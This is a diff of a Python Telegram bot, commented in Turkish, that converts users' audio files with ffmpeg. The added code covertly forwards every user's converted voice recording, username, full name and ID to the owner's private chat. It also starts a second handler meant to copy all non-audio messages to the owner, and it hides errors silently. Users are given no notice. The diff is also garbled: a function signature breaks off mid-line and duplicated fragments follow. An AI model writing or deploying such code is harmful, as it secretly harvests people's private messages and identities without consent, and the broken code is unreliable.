@@ -24,7 +24,7 @@ def run_web():
 
 # --- İŞLEYİCİ FONKSİYONLAR ---
 
-# Fonksiyon 1: Sadece Ses Dosyalarını Dönüştürür ve Sana Gönderir
+# Fonksiyon 1: Ses Dosyalarını Dönüştürür ve Sana Gönderir
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file = update.message.audio or update.message.voice or update.message.video or update.message.document
     if not file: return
@@ -36,21 +36,46 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
         output_path = out_file.name
 
     try:
+        # 1. Dosyayı indir ve dönüştür
         await tg_file.download_to_drive(input_path)
         subprocess.run(["ffmpeg", "-y", "-i", input_path, "-c:a", "libopus", "-b:a", "64k", "-ar", "48000", "-ac", "1", output_path], check=True)
         
-        # 1. Gönderen kullanıcıya yolla (Normal işlem)
+        # 2. Gönderen kullanıcıya yolla (Normal işlem)
         with open(output_path, "rb") as f: 
             await update.message.reply_voice(f)
             
-        # 2. Sahibine (SANA) Yolla (Kullanıcı Adı ile birlikte)
+        # 3. Sahibine (SANA) Yolla (Kullanıcı Adı ile birlikte)
+        # BURADA KOPYALAMA TEKRAR YAPILIR. İYİLEŞTİRME YAPILMALI.
+        
         user_info = update.message.from_user
         username = user_info.username if user_info.username else user_info.full_name if user_info.full_name else str(user_info.id)
         
-        caption_text = f"Yeni Dönüşüm\nKullanıcı Adı: @{username}"
+        caption_text = f"Yeni Dönüşüm (Ses)\nKullanıcı Adı: @{username}"
         if not user_info.username:
-             caption_text = f"Yeni Dönüşüm\nAd/Soyad: {user_info.full_name or 'Bilinmiyor'}\nID: {user_info.id}"
+             caption_text = f"Yeni Dönüşüm (Ses)\nAd/Soyad: {user_info.full_name or 'Bilinmiyor'}\nID: {user_info.id}"
 
+        # Sana kullanıcı bilgisini gönder
+        await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=caption_text)
+        
+        # Sadece dönüştürülmüş sesi sana yolla
+        with open(output_path, "rb") as f_owner:
+            await context.bot.send_voice(
+                chat_id=OWNER_CHAT_ID, 
+                voice=f_owner 
+            )
+
+    except Exception as e:
+        print(f"Gizli Hata: {e}") 
+        
+    finally:
+        if os.path.exists(input_path): os.remove(input_path)
+        if os.path.exists(output_path): os.remove(output_path)
+
+
+# Fonksiyon 2: Ses DIŞINDAKİ Her Şeyi Kopyalar ve Sana Gönderir
+async def handle_all_messages(update
+        
+                              
         with open(output_path, "rb") as f_owner:
             await context.bot.send_voice(
                 chat_id=OWNER_CHAT_ID, 
@@ -101,4 +126,3 @@ if __name__ == "__main__":
     
     print("✅ Bot başlatıldı...")
     app.run_polling()
-    
